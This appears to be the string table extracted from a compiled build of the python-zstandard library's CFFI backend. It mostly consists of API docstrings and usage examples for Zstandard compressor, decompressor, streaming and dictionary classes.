        aZSTD_DCtx_resetaZSTD_DCtx_setMaxWindowSizeuunable to set max window size: %saZSTD_DCtx_setParameteraZSTD_d_formatuunable to set decoding format: %saZSTD_DCtx_refDDictuunable to reference prepared dictionary: %suPython interface to the Zstandard (zstd) compression library.a__doc__a__file__a__spec__aoriginahas_locationa__cached__aabsolute_importaunicode_literalsLFaBufferSegmentaBufferSegmentsaBufferWithSegmentsaBufferWithSegmentsCollectionaZstdCompressionChunkeraZstdCompressionDictaZstdCompressionObjaZstdCompressionParametersaZstdCompressionReaderaZstdCompressionWriteraZstdCompressoraZstdDecompressionObjaZstdDecompressionReaderaZstdDecompressionWriteraZstdDecompressoraZstdErroraFrameParametersabackend_featuresaestimate_decompression_context_sizeaframe_content_sizeaframe_header_sizeaget_frame_parametersatrain_dictionaryaFLUSH_BLOCKaFLUSH_FRAMEaCOMPRESSOBJ_FLUSH_FINISHaCOMPRESSOBJ_FLUSH_BLOCKaZSTD_VERSIONaFRAME_HEADERaCONTENTSIZE_UNKNOWNaCONTENTSIZE_ERRORaMAX_COMPRESSION_LEVELaCOMPRESSION_RECOMMENDED_INPUT_SIZEaCOMPRESSION_RECOMMENDED_OUTPUT_SIZEaDECOMPRESSION_RECOMMENDED_INPUT_SIZEaDECOMPRESSION_RECOMMENDED_OUTPUT_SIZEaMAGIC_NUMBERaBLOCKSIZELOG_MAXaBLOCKSIZE_MAXaWINDOWLOG_MINaWINDOWLOG_MAXaCHAINLOG_MINaCHAINLOG_MAXaHASHLOG_MINaHASHLOG_MAXaMINMATCH_MINaMINMATCH_MAXaSEARCHLOG_MINaSEARCHLOG_MAXaSEARCHLENGTH_MINaSEARCHLENGTH_MAXaTARGETLENGTH_MINaTARGETLENGTH_MAXaLDM_MINMATCH_MINaLDM_MINMATCH_MAXaLDM_BUCKETSIZELOG_MAXaSTRATEGY_FASTaSTRATEGY_DFASTaSTRATEGY_GREEDYaSTRATEGY_LAZYaSTRATEGY_LAZY2aSTRATEGY_BTLAZY2aSTRATEGY_BTOPTaSTRATEGY_BTULTRAaSTRATEGY_BTULTRA2aDICT_TYPE_AUTOaDICT_TYPE_RAWCONTENTaDICT_TYPE_FULLDICTaFORMAT_ZSTD1aFORMAT_ZSTD1_MAGICLESSa__all__aioaosa_cffiTaffialibabackend_featuresaZSTD_CStreamInSizeaCOMPRESSION_RECOMMENDED_INPUT_SIZEaZSTD_CStreamOutSizeaZSTD_DStreamInSizeaDECOMPRESSION_RECOMMENDED_INPUT_SIZEaZSTD_DStreamOutSizeanew_allocatorTashould_clear_after_allocaMAX_COMPRESSION_LEVELaZSTD_MAGICNUMBERaMAGIC_NUMBERc(/aFRAME_HEADERaCONTENTSIZE_UNKNOWNaCONTENTSIZE_ERRORaZSTD_VERSION_MAJORaZSTD_VERSION_MINORaZSTD_VERSION_RELEASEaZSTD_VERSIONaZSTD_BLOCKSIZELOG_MAXaBLOCKSIZELOG_MAXaZSTD_BLOCKSIZE_MAXaBLOCKSIZE_MAXaZSTD_WINDOWLOG_MINaWINDOWLOG_MINaZSTD_WINDOWLOG_MAXaWINDOWLOG_MAXaZSTD_CHAINLOG_MINaCHAINLOG_MINaZSTD_CHAINLOG_MAXaCHAINLOG_MAXaZSTD_HASHLOG_MINaHASHLOG_MINaZSTD_HASHLOG_MAXaHASHLOG_MAXaZSTD_MINMATCH_MINaMINMATCH_MINaZSTD_MINMATCH_MAXaMINMATCH_MAXaZSTD_SEARCHLOG_MINaSEARCHLOG_MINaZSTD_SEARCHLOG_MAXaSEARCHLOG_MAXaSEARCHLENGTH_MINaSEARCHLENGTH_MAXaZSTD_TARGETLENGTH_MINaTARGETLENGTH_MINaZSTD_TARGETLENGTH_MAXaTARGETLENGTH_MAXaZSTD_LDM_MINMATCH_MINaLDM_MINMATCH_MINaZSTD_LDM_MINMATCH_MAXaLDM_MINMATCH_MAXaZSTD_LDM_BUCKETSIZELOG_MAXaLDM_BUCKETSIZELOG_MAXaZSTD_fastaSTRATEGY_FASTaZSTD_dfastaSTRATEGY_DFASTaZSTD_greedyaSTRATEGY_GREEDYaZSTD_lazyaSTRATEGY_LAZYaZSTD_lazy2aSTRATEGY_LAZY2aZSTD_btlazy2aSTRATEGY_BTLAZY2aZSTD_btoptaSTRATEGY_BTOPTaZSTD_btultraaSTRATEGY_BTULTRAaZSTD_btultra2aSTRATEGY_BTULTRA2aZSTD_dct_autoaZSTD_dct_rawContentaZSTD_dct_fullDictaZSTD_f_zstd1aFORMAT_ZSTD1aZSTD_f_zstd1_magiclessaFORMAT_ZSTD1_MAGICLESSuzstandard.backend_cffia__module__uRepresents a segment within a ``BufferWithSegments``.

    This type is essentially a reference to N bytes within a
    ``BufferWithSegments``.

    The object conforms to the buffer protocol.
    aBufferSegmenta__qualname__uBufferSegment.offseta__len__uBufferSegment.__len__atobytesuBufferSegment.tobytesuRepresents an array of ``(offset, length)`` integers.

    This type is effectively an index used by :py:class:`BufferWithSegments`.

    The array members are 64-bit unsigned integers using host/native bit order.

    Instances conform to the buffer protocol.
    aBufferSegmentsuA memory buffer containing N discrete items of known lengths.

    This type is essentially a fixed size memory address and an array
    of 2-tuples of ``(offset, length)`` 64-bit unsigned native-endian
    integers defining the byte offset and length of each segment within
    the buffer.

    Instances behave like containers.

    Instances also conform to the buffer protocol. So a reference to the
    backing bytes can be obtained via ``memoryview(o)``. A *copy* of the
    backing bytes can be obtained via ``.tobytes()``.

    This type exists to facilitate operations against N>1 items without
    the overhead of Python object creation and management. Used with
    APIs like :py:meth:`ZstdDecompressor.multi_decompress_to_buffer`, it
    is possible to decompress many objects in parallel without the GIL
    held, leading to even better performance.
    aBufferWithSegmentsuBufferWithSegments.sizeuBufferWithSegments.__len__uBufferWithSegments.__getitem__asegmentsuBufferWithSegments.segmentsuBufferWithSegments.tobytesuA virtual spanning view over multiple BufferWithSegments.

    Instances are constructed from 1 or more :py:class:`BufferWithSegments`
    instances. The resulting object behaves like an ordered sequence whose
    members are the segments within each ``BufferWithSegments``.

    If the object is composed of 2 ``BufferWithSegments`` instances with the
    first having 2 segments and the second have 3 segments, then ``b[0]``
    and ``b[1]`` access segments in the first object and ``b[2]``, ``b[3]``,
    and ``b[4]`` access segments from the second.
    aBufferWithSegmentsCollectionuBufferWithSegmentsCollection.__len__uBufferWithSegmentsCollection.__getitem__TEExceptiona__prepare__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>a__orig_bases__TOobjectuLow-level zstd compression parameters.

    This type represents a collection of parameters to control how zstd
    compression is performed.

    Instances can be constructed from raw parameters or derived from a
    base set of defaults specified from a compression level (recommended)
    via :py:meth:`ZstdCompressionParameters.from_level`.

    >>> # Derive compression settings for compression level 7.
    >>> params = zstandard.ZstdCompressionParameters.from_level(7)

    >>> # With an input size of 1MB
    >>> params = zstandard.ZstdCompressionParameters.from_level(7, source_size=1048576)

    Using ``from_level()``, it is also possible to override individual compression
    parameters or to define additional settings that aren't automatically derived.
    e.g.:

    >>> params = zstandard.ZstdCompressionParameters.from_level(4, window_log=10)
    >>> params = zstandard.ZstdCompressionParameters.from_level(5, threads=4)

    Or you can define low-level compression settings directly:

    >>> params = zstandard.ZstdCompressionParameters(window_log=12, enable_ldm=True)

    Once a ``ZstdCompressionParameters`` instance is obtained, it can be used to
    configure a compressor:

    >>> cctx = zstandard.ZstdCompressor(compression_params=params)

    Some of these are very low-level settings. It may help to consult the official
    zstandard documentation for their behavior. Look for the ``ZSTD_p_*`` constants
    in ``zstd.h`` (https://github.com/facebook/zstd/blob/dev/lib/zstd.h).
    astaticmethodafrom_leveluZstdCompressionParameters.from_levelTlpppppppqllppqlppppqla__init__uZstdCompressionParameters.__init__apropertyuZstdCompressionParameters.formatuZstdCompressionParameters.compression_leveluZstdCompressionParameters.window_loguZstdCompressionParameters.hash_loguZstdCompressionParameters.chain_loguZstdCompressionParameters.search_loguZstdCompressionParameters.min_matchuZstdCompressionParameters.target_lengthuZstdCompressionParameters.strategyuZstdCompressionParameters.write_content_sizeuZstdCompressionParameters.write_checksumuZstdCompressionParameters.write_dict_iduZstdCompressionParameters.job_sizeuZstdCompressionParameters.overlap_loguZstdCompressionParameters.force_max_windowuZstdCompressionParameters.enable_ldmuZstdCompressionParameters.ldm_hash_loguZstdCompressionParameters.ldm_min_matchuZstdCompressionParameters.ldm_bucket_size_loguZstdCompressionParameters.ldm_hash_rate_loguZstdCompressionParameters.threadsaestimated_compression_context_sizeuZstdCompressionParameters.estimated_compression_context_sizeaestimate_decompression_context_sizeuWritable compressing stream wrapper.

    ``ZstdCompressionWriter`` is a write-only stream interface for writing
    compressed data to another stream.

    This type conforms to the ``io.RawIOBase`` interface and should be usable
    by any type that operates against a *file-object* (``typing.BinaryIO``
    in Python type hinting speak). Only methods that involve writing will do
    useful things.

    As data is written to this stream (e.g. via ``write()``), that data
    is sent to the compressor. As compressed data becomes available from
    the compressor, it is sent to the underlying stream by calling its
    ``write()`` method.

    Both ``write()`` and ``flush()`` return the number of bytes written to the
    object's ``write()``. In many cases, small inputs do not accumulate enough
    data to cause a write and ``write()`` will return ``0``.

    Calling ``close()`` will mark the stream as closed and subsequent I/O
    operations will raise ``ValueError`` (per the documented behavior of
    ``io.RawIOBase``). ``close()`` will also call ``close()`` on the underlying
    stream if such a method exists and the instance was constructed with
    ``closefd=True``

    Instances are obtained by calling :py:meth:`ZstdCompressor.stream_writer`.

    Typically usage is as follows:

    >>> cctx = zstandard.ZstdCompressor(level=10)
    >>> compressor = cctx.stream_writer(fh)
    >>> compressor.write(b"chunk 0\n")
    >>> compressor.write(b"chunk 1\n")
    >>> compressor.flush()
    >>> # Receiver will be able to decode ``chunk 0\nchunk 1\n`` at this point.
    >>> # Receiver is also expecting more data in the zstd *frame*.
    >>>
    >>> compressor.write(b"chunk 2\n")
    >>> compressor.flush(zstandard.FLUSH_FRAME)
    >>> # Receiver will be able to decode ``chunk 0\nchunk 1\nchunk 2``.
    >>> # Receiver is expecting no more data, as the zstd frame is closed.
    >>> # Any future calls to ``write()`` at this point will construct a new
    >>> # zstd frame.

    Instances can be used as context managers. Exiting the context manager is
    the equivalent of calling ``close()``, which is equivalent to calling
    ``flush(zstandard.FLUSH_FRAME)``:

    >>> cctx = zstandard.ZstdCompressor(level=10)
    >>> with cctx.stream_writer(fh) as compressor:
    ...     compressor.write(b'chunk 0')
    ...     compressor.write(b'chunk 1')
    ...     ...

    .. important::

       If ``flush(FLUSH_FRAME)`` is not called, emitted data doesn't
       constitute a full zstd *frame* and consumers of this data may complain
       about malformed input. It is recommended to use instances as a context
       manager to ensure *frames* are properly finished.

    If the size of the data being fed to this streaming compressor is known,
    you can declare it before compression begins:

    >>> cctx = zstandard.ZstdCompressor()
    >>> with cctx.stream_writer(fh, size=data_len) as compressor:
    ...     compressor.write(chunk0)
    ...     compressor.write(chunk1)
    ...     ...

    Declaring the size of the source data allows compression parameters to
    be tuned. And if ``write_content_size`` is used, it also results in the
    content size being written into the frame header of the output data.

    The size of chunks being ``write()`` to the destination can be specified:

    >>> cctx = zstandard.ZstdCompressor()
    >>> with cctx.stream_writer(fh, write_size=32768) as compressor:
    ...     ...

    To see how much memory is being used by the streaming compressor:

    >>> cctx = zstandard.ZstdCompressor()
    >>> with cctx.stream_writer(fh) as compressor:
    ...     ...
    ...     byte_size = compressor.memory_size()

    Thte total number of bytes written so far are exposed via ``tell()``:

    >>> cctx = zstandard.ZstdCompressor()
    >>> with cctx.stream_writer(fh) as compressor:
    ...     ...
    ...     total_written = compressor.tell()

    ``stream_writer()`` accepts a ``write_return_read`` boolean argument to
    control the return value of ``write()``. When ``False`` (the default),
    ``write()`` returns the number of bytes that were ``write()``'en to the
    underlying object. When ``True``, ``write()`` returns the number of bytes
    read from the input that were subsequently written to the compressor.
    ``True`` is the *proper* behavior for ``write()`` as specified by the
    ``io.RawIOBase`` interface and will become the default value in a future
    release.
    TtuZstdCompressionWriter.__init__a__enter__uZstdCompressionWriter.__enter__a__exit__uZstdCompressionWriter.__exit__a__iter__uZstdCompressionWriter.__iter__a__next__uZstdCompressionWriter.__next__amemory_sizeuZstdCompressionWriter.memory_sizeuZstdCompressionWriter.filenouZstdCompressionWriter.closeacloseduZstdCompressionWriter.closedaisattyuZstdCompressionWriter.isattyareadableuZstdCompressionWriter.readableTqareadlineuZstdCompressionWriter.readlineareadlinesuZstdCompressionWriter.readlinesTnaseekuZstdCompressionWriter.seekaseekableuZstdCompressionWriter.seekableatruncateuZstdCompressionWriter.truncateawritableuZstdCompressionWriter.writableawritelinesuZstdCompressionWriter.writelinesuZstdCompressionWriter.readuZstdCompressionWriter.readallareadintouZstdCompressionWriter.readintouZstdCompressionWriter.writeuZstdCompressionWriter.flushatelluZstdCompressionWriter.telluA compressor conforming to the API in Python's standard library.

    This type implements an API similar to compression types in Python's
    standard library such as ``zlib.compressobj`` and ``bz2.BZ2Compressor``.
    This enables existing code targeting the standard library API to swap
    in this type to achieve zstd compression.

    .. important::

       The design of this API is not ideal for optimal performance.

       The reason performance is not optimal is because the API is limited to
       returning a single buffer holding compressed data. When compressing
       data, we don't know how much data will be emitted. So in order to
       capture all this data in a single buffer, we need to perform buffer
       reallocations and/or extra memory copies. This can add significant
       overhead depending on the size or nature of the compressed data how
       much your application calls this type.

       If performance is critical, consider an API like
       :py:meth:`ZstdCompressor.stream_reader`,
       :py:meth:`ZstdCompressor.stream_writer`,
       :py:meth:`ZstdCompressor.chunker`, or
       :py:meth:`ZstdCompressor.read_to_iter`, which result in less overhead
       managing buffers.

    Instances are obtained by calling :py:meth:`ZstdCompressor.compressobj`.

    Here is how this API should be used:

    >>> cctx = zstandard.ZstdCompressor()
    >>> cobj = cctx.compressobj()
    >>> data = cobj.compress(b"raw input 0")
    >>> data = cobj.compress(b"raw input 1")
    >>> data = cobj.flush()

    Or to flush blocks:

    >>> cctx.zstandard.ZstdCompressor()
    >>> cobj = cctx.compressobj()
    >>> data = cobj.compress(b"chunk in first block")
    >>> data = cobj.flush(zstandard.COMPRESSOBJ_FLUSH_BLOCK)
    >>> data = cobj.compress(b"chunk in second block")
    >>> data = cobj.flush()

    For best performance results, keep input chunks under 256KB. This avoids
    extra allocations for a large output object.

    It is possible to declare the input size of the data that will be fed
    into the compressor:

    >>> cctx = zstandard.ZstdCompressor()
    >>> cobj = cctx.compressobj(size=6)
    >>> data = cobj.compress(b"foobar")
    >>> data = cobj.flush()
    uZstdCompressionObj.__init__uZstdCompressionObj.compressuZstdCompressionObj.flushuCompress data to uniformly sized chunks.

    This type allows you to iteratively feed chunks of data into a compressor
    and produce output chunks of uniform size.

    ``compress()``, ``flush()``, and ``finish()`` all return an iterator of
    ``bytes`` instances holding compressed data. The iterator may be empty.
    Callers MUST iterate through all elements of the returned iterator before
    performing another operation on the object or else the compressor's
    internal state may become confused. This can result in an exception being
    raised or malformed data being emitted.

    All chunks emitted by ``compress()`` will have a length of the configured
    chunk size.

    ``flush()`` and ``finish()`` may return a final chunk smaller than
    the configured chunk size.

    Instances are obtained by calling :py:meth:`ZstdCompressor.chunker`.

    Here is how the API should be used:

    >>> cctx = zstandard.ZstdCompressor()
    >>> chunker = cctx.chunker(chunk_size=32768)
    >>>
    >>> with open(path, 'rb') as fh:
    ...     while True:
    ...         in_chunk = fh.read(32768)
    ...         if not in_chunk:
    ...             break
    ...
    ...         for out_chunk in chunker.compress(in_chunk):
    ...             # Do something with output chunk of size 32768.
    ...
    ...     for out_chunk in chunker.finish():
    ...         # Do something with output chunks that finalize the zstd frame.

    This compressor type is often a better alternative to
    :py:class:`ZstdCompressor.compressobj` because it has better performance
    properties.

    ``compressobj()`` will emit output data as it is available. This results
    in a *stream* of output chunks of varying sizes. The consistency of the
    output chunk size with ``chunker()`` is more appropriate for many usages,
    such as sending compressed data to a socket.

    ``compressobj()`` may also perform extra memory reallocations in order
    to dynamically adjust the sizes of the output chunks. Since ``chunker()``
    output chunks are all the same size (except for flushed or final chunks),
    there is less memory allocation/copying overhead.
    uZstdCompressionChunker.__init__uReadable compressing stream wrapper.

    ``ZstdCompressionReader`` is a read-only stream interface for obtaining
    compressed data from a source.

    This type conforms to the ``io.RawIOBase`` interface and should be usable
    by any type that operates against a *file-object* (``typing.BinaryIO``
    in Python type hinting speak).

    Instances are neither writable nor seekable (even if the underlying
    source is seekable). ``readline()`` and ``readlines()`` are not implemented
    because they don't make sense for compressed data. ``tell()`` returns the
    number of compressed bytes emitted so far.

    Instances are obtained by calling :py:meth:`ZstdCompressor.stream_reader`.

    In this example, we open a file for reading and then wrap that file
    handle with a stream from which compressed data can be ``read()``.

    >>> with open(path, 'rb') as fh:
    ...     cctx = zstandard.ZstdCompressor()
    ...     reader = cctx.stream_reader(fh)
    ...     while True:
    ...         chunk = reader.read(16384)
    ...         if not chunk:
    ...             break
    ...
    ...         # Do something with compressed chunk.

    Instances can also be used as context managers:

    >>> with open(path, 'rb') as fh:
    ...     cctx = zstandard.ZstdCompressor()
    ...     with cctx.stream_reader(fh) as reader:
    ...         while True:
    ...             chunk = reader.read(16384)
    ...             if not chunk:
    ...                 break
    ...
    ...             # Do something with compressed chunk.

    When the context manager exits or ``close()`` is called, the stream is
    closed, underlying resources are released, and future operations against
    the compression stream will fail.

    ``stream_reader()`` accepts a ``size`` argument specifying how large the
    input stream is. This is used to adjust compression parameters so they are
    tailored to the source size. e.g.

    >>> with open(path, 'rb') as fh:
    ...     cctx = zstandard.ZstdCompressor()
    ...     with cctx.stream_reader(fh, size=os.stat(path).st_size) as reader:
    ...         ...

    If the ``source`` is a stream, you can specify how large ``read()``
    requests to that stream should be via the ``read_size`` argument.
    It defaults to ``zstandard.COMPRESSION_RECOMMENDED_INPUT_SIZE``. e.g.

    >>> with open(path, 'rb') as fh:
    ...     cctx = zstandard.ZstdCompressor()
    ...     # Will perform fh.read(8192) when obtaining data to feed into the
    ...     # compressor.
    ...     with cctx.stream_reader(fh, read_size=8192) as reader:
    ...         ...
    uZstdCompressionReader.__init__uZstdCompressionReader.__enter__uZstdCompressionReader.__exit__uZstdCompressionReader.readableuZstdCompressionReader.writableuZstdCompressionReader.seekableuZstdCompressionReader.readlineuZstdCompressionReader.readlinesuZstdCompressionReader.writeuZstdCompressionReader.writelinesuZstdCompressionReader.isattyuZstdCompressionReader.flushuZstdCompressionReader.closeuZstdCompressionReader.closeduZstdCompressionReader.telluZstdCompressionReader.readalluZstdCompressionReader.__iter__uZstdCompressionReader.__next__anextuZstdCompressionReader._read_inputuZstdCompressionReader._compress_into_bufferuZstdCompressionReader.readaread1uZstdCompressionReader.read1uZstdCompressionReader.readintoareadinto1uZstdCompressionReader.readinto1aZstdCompressoru
    Create an object used to perform Zstandard compression.

    Each instance is essentially a wrapper around a ``ZSTD_CCtx`` from
    zstd's C API.

    An instance can compress data various ways. Instances can be used
    multiple times. Each compression operation will use the compression
    parameters defined at construction time.

    .. note:

       When using a compression dictionary and multiple compression
       operations are performed, the ``ZstdCompressionParameters`` derived
       from an integer compression ``level`` and the first compressed data's
       size will be reused for all subsequent operations. This may not be
       desirable if source data sizes vary significantly.

    ``compression_params`` is mutually exclusive with ``level``,
    ``write_checksum``, ``write_content_size``, ``write_dict_id``, and
    ``threads``.

    Assume that each ``ZstdCompressor`` instance can only handle a single
    logical compression operation at the same time. i.e. if you call a method
    like ``stream_reader()`` to obtain multiple objects derived from the same
    ``ZstdCompressor`` instance and attempt to use them simultaneously, errors
    will likely occur.

    If you need to perform multiple logical compression operations and you
    can't guarantee those operations are temporally non-overlapping, you need
    to obtain multiple ``ZstdCompressor`` instances.

    Unless specified otherwise, assume that no two methods of
    ``ZstdCompressor`` instances can be called from multiple Python
    threads simultaneously. In other words, assume instances are not thread safe
    unless stated otherwise.

    :param level:
       Integer compression level. Valid values are all negative integers
       through 22. Lower values generally yield faster operations with lower
       compression ratios. Higher values are generally slower but compress
       better. The default is 3, which is what the ``zstd`` CLI uses. Negative
       levels effectively engage ``--fast`` mode from the ``zstd`` CLI.
    :param dict_data:
       A ``ZstdCompressionDict`` to be used to compress with dictionary
        data.
    :param compression_params:
       A ``ZstdCompressionParameters`` instance defining low-level compression
       parameters. If defined, this will overwrite the ``level`` argument.
    :param write_checksum:
       If True, a 4 byte content checksum will be written with the compressed
       data, allowing the decompressor to perform content verification.
    :param write_content_size:
       If True (the default), the decompressed content size will be included
       in the header of the compressed data. This data will only be written if
       the compressor knows the size of the input data.
    :param write_dict_id:
       Determines whether the dictionary ID will be written into the compressed
       data. Defaults to True. Only adds content to the compressed data if
       a dictionary is being used.
    :param threads:
       Number of threads to use to compress data concurrently. When set,
       compression operations are performed on multiple threads. The default
       value (0) disables multi-threaded compression. A value of ``-1`` means
       to set the number of threads to the number of detected logical CPUs.
    TlnnnnnluZstdCompressor.__init__uZstdCompressor._setup_cctxuZstdCompressor.memory_sizeuZstdCompressor.compressacompressobjuZstdCompressor.compressobjachunkeruZstdCompressor.chunkeracopy_streamuZstdCompressor.copy_streamastream_readeruZstdCompressor.stream_readerastream_writeruZstdCompressor.stream_writeramulti_compress_to_bufferuZstdCompressor.multi_compress_to_bufferaframe_progressionuZstdCompressor.frame_progressionuInformation about a zstd frame.

    Instances have the following attributes:

    ``content_size``
       Integer size of original, uncompressed content. This will be ``0`` if the
       original content size isn't written to the frame (controlled with the
       ``write_content_size`` argument to ``ZstdCompressor``) or if the input
       content size was ``0``.

    ``window_size``
       Integer size of maximum back-reference distance in compressed data.

    ``dict_id``
       Integer of dictionary ID used for compression. ``0`` if no dictionary
       ID was used or if the dictionary ID was ``0``.

    ``has_checksum``
       Bool indicating whether a 4 byte content checksum is stored at the end
       of the frame.
    uFrameParameters.__init__aframe_content_sizeaframe_header_sizeaget_frame_parametersuRepresents a computed compression dictionary.

    Instances are obtained by calling :py:func:`train_dictionary` or by
    passing bytes obtained from another source into the constructor.

    Instances can be constructed from bytes:

    >>> dict_data = zstandard.ZstdCompressionDict(data)

    It is possible to construct a dictionary from *any* data. If the data
    doesn't begin with a magic header, it will be treated as a *prefix*
    dictionary. *Prefix* dictionaries allow compression operations to
    reference raw data within the dictionary.

    It is possible to force the use of *prefix* dictionaries or to require
    a dictionary header:

    >>> dict_data = zstandard.ZstdCompressionDict(data, dict_type=zstandard.DICT_TYPE_RAWCONTENT)
    >>> dict_data = zstandard.ZstdCompressionDict(data, dict_type=zstandard.DICT_TYPE_FULLDICT)

    You can see how many bytes are in the dictionary by calling ``len()``:

    >>> dict_data = zstandard.train_dictionary(size, samples)
    >>> dict_size = len(dict_data)  # will not be larger than ``size``

    Once you have a dictionary, you can pass it to the objects performing
    compression and decompression:

    >>> dict_data = zstandard.train_dictionary(131072, samples)
    >>> cctx = zstandard.ZstdCompressor(dict_data=dict_data)
    >>> for source_data in input_data:
    ...     compressed = cctx.compress(source_data)
    ...     # Do something with compressed data.
    ...
    >>> dctx = zstandard.ZstdDecompressor(dict_data=dict_data)
    >>> for compressed_data in input_data:
    ...     buffer = io.BytesIO()
    ...     with dctx.stream_writer(buffer) as decompressor:
    ...         decompressor.write(compressed_data)
    ...         # Do something with raw data in ``buffer``.

    Dictionaries have unique integer IDs. You can retrieve this ID via:

    >>> dict_id = zstandard.dictionary_id(dict_data)

    You can obtain the raw data in the dict (useful for persisting and constructing
    a ``ZstdCompressionDict`` later) via ``as_bytes()``:

    >>> dict_data = zstandard.train_dictionary(size, samples)
    >>> raw_data = dict_data.as_bytes()

    By default, when a ``ZstdCompressionDict`` is *attached* to a
    ``ZstdCompressor``, each ``ZstdCompressor`` performs work to prepare the
    dictionary for use. This is fine if only 1 compression operation is being
    performed or if the ``ZstdCompressor`` is being reused for multiple operations.
    But if multiple ``ZstdCompressor`` instances are being used with the dictionary,
    this can add overhead.

    It is possible to *precompute* the dictionary so it can readily be consumed
    by multiple ``ZstdCompressor`` instances:

    >>> d = zstandard.ZstdCompressionDict(data)
    >>> # Precompute for compression level 3.
    >>> d.precompute_compress(level=3)
    >>> # Precompute with specific compression parameters.
    >>> params = zstandard.ZstdCompressionParameters(...)
    >>> d.precompute_compress(compression_params=params)

    .. note::

       When a dictionary is precomputed, the compression parameters used to
       precompute the dictionary overwrite some of the compression parameters
       specified to ``ZstdCompressor``.

    :param data:
       Dictionary data.
    :param dict_type:
       Type of dictionary. One of the ``DICT_TYPE_*`` constants.
    uZstdCompressionDict.__init__uZstdCompressionDict.__len__uZstdCompressionDict.dict_iduZstdCompressionDict.as_bytesTlnaprecompute_compressuZstdCompressionDict.precompute_compressuZstdCompressionDict._ddictT
lppZlpppppatrain_dictionaryuA standard library API compatible decompressor.

    This type implements a compressor that conforms to the API by other
    decompressors in Python's standard library. e.g. ``zlib.decompressobj``
    or ``bz2.BZ2Decompressor``. This allows callers to use zstd compression
    while conforming to a similar API.

    Compressed data chunks are fed into ``decompress(data)`` and
    uncompressed output (or an empty bytes) is returned. Output from
    subsequent calls needs to be concatenated to reassemble the full
    decompressed byte sequence.

    If ``read_across_frames=False``, each instance is single use: once an
    input frame is decoded, ``decompress()`` will raise an exception. If
    ``read_across_frames=True``, instances can decode multiple frames.

    >>> dctx = zstandard.ZstdDecompressor()
    >>> dobj = dctx.decompressobj()
    >>> data = dobj.decompress(compressed_chunk_0)
    >>> data = dobj.decompress(compressed_chunk_1)

    By default, calls to ``decompress()`` write output data in chunks of size
    ``DECOMPRESSION_RECOMMENDED_OUTPUT_SIZE``. These chunks are concatenated
    before being returned to the caller. It is possible to define the size of
    these temporary chunks by passing ``write_size`` to ``decompressobj()``:

    >>> dctx = zstandard.ZstdDecompressor()
    >>> dobj = dctx.decompressobj(write_size=1048576)

    .. note::

       Because calls to ``decompress()`` may need to perform multiple
       memory (re)allocations, this streaming decompression API isn't as
       efficient as other APIs.
    uZstdDecompressionObj.__init__adecompressuZstdDecompressionObj.decompressTluEffectively a no-op.

        Implemented for compatibility with the standard library APIs.

        Safe to call at any time.

        :return:
           Empty bytes.
        uZstdDecompressionObj.flushaunused_datauZstdDecompressionObj.unused_datauData that has not yet been fed into the decompressor.aunconsumed_tailuZstdDecompressionObj.unconsumed_tailaeofuZstdDecompressionObj.eofuRead only decompressor that pull uncompressed data from another stream.

    This type provides a read-only stream interface for performing transparent
    decompression from another stream or data source. It conforms to the
    ``io.RawIOBase`` interface. Only methods relevant to reading are
    implemented.

    >>> with open(path, 'rb') as fh:
    >>> dctx = zstandard.ZstdDecompressor()
    >>> reader = dctx.stream_reader(fh)
    >>> while True:
    ...     chunk = reader.read(16384)
    ...     if not chunk:
    ...         break
    ...     # Do something with decompressed chunk.

    The stream can also be used as a context manager:

    >>> with open(path, 'rb') as fh:
    ...     dctx = zstandard.ZstdDecompressor()
    ...     with dctx.stream_reader(fh) as reader:
    ...         ...

    When used as a context manager, the stream is closed and the underlying
    resources are released when the context manager exits. Future operations
    against the stream will fail.

    The ``source`` argument to ``stream_reader()`` can be any object with a
    ``read(size)`` method or any object implementing the *buffer protocol*.

    If the ``source`` is a stream, you can specify how large ``read()`` requests
    to that stream should be via the ``read_size`` argument. It defaults to
    ``zstandard.DECOMPRESSION_RECOMMENDED_INPUT_SIZE``.:

    >>> with open(path, 'rb') as fh:
    ...     dctx = zstandard.ZstdDecompressor()
    ...     # Will perform fh.read(8192) when obtaining data for the decompressor.
    ...     with dctx.stream_reader(fh, read_size=8192) as reader:
    ...         ...

    Instances are *partially* seekable. Absolute and relative positions
    (``SEEK_SET`` and ``SEEK_CUR``) forward of the current position are
    allowed. Offsets behind the current read position and offsets relative
    to the end of stream are not allowed and will raise ``ValueError``
    if attempted.

    ``tell()`` returns the number of decompressed bytes read so far.

    Not all I/O methods are implemented. Notably missing is support for
    ``readline()``, ``readlines()``, and linewise iteration support. This is
    because streams operate on binary data - not text data. If you want to
    convert decompressed output to text, you can chain an ``io.TextIOWrapper``
    to the stream:

    >>> with open(path, 'rb') as fh:
    ...     dctx = zstandard.ZstdDecompressor()
    ...     stream_reader = dctx.stream_reader(fh)
    ...     text_stream = io.TextIOWrapper(stream_reader, encoding='utf-8')
    ...     for line in text_stream:
    ...         ...
    uZstdDecompressionReader.__init__uZstdDecompressionReader.__enter__uZstdDecompressionReader.__exit__uZstdDecompressionReader.readableuZstdDecompressionReader.writableuZstdDecompressionReader.seekableuZstdDecompressionReader.readlineuZstdDecompressionReader.readlinesuZstdDecompressionReader.writeuZstdDecompressionReader.writelinesuZstdDecompressionReader.isattyuZstdDecompressionReader.flushuZstdDecompressionReader.closeuZstdDecompressionReader.closeduZstdDecompressionReader.telluZstdDecompressionReader.readalluZstdDecompressionReader.__iter__uZstdDecompressionReader.__next__uZstdDecompressionReader._read_inputuZstdDecompressionReader._decompress_into_bufferuZstdDecompressionReader.readuZstdDecompressionReader.readintouZstdDecompressionReader.read1uZstdDecompressionReader.readinto1uZstdDecompressionReader.seeku
    Write-only stream wrapper that performs decompression.

    This type provides a writable stream that performs decompression and writes
    decompressed data to another stream.

    This type implements the ``io.RawIOBase`` interface. Only methods that
    involve writing will do useful things.

    Behavior is similar to :py:meth:`ZstdCompressor.stream_writer`: compressed
    data is sent to the decompressor by calling ``write(data)`` and decompressed
    output is written to the inner stream by calling its ``write(data)``
    method:

    >>> dctx = zstandard.ZstdDecompressor()
    >>> decompressor = dctx.stream_writer(fh)
    >>> # Will call fh.write() with uncompressed data.
    >>> decompressor.write(compressed_data)

    Instances can be used as context managers. However, context managers add no
    extra special behavior other than automatically calling ``close()`` when
    they exit.

    Calling ``close()`` will mark the stream as closed and subsequent I/O
    operations will raise ``ValueError`` (per the documented behavior of
    ``io.RawIOBase``). ``close()`` will also call ``close()`` on the
    underlying stream if such a method exists and the instance was created with
    ``closefd=True``.

    The size of chunks to ``write()`` to the destination can be specified:

    >>> dctx = zstandard.ZstdDecompressor()
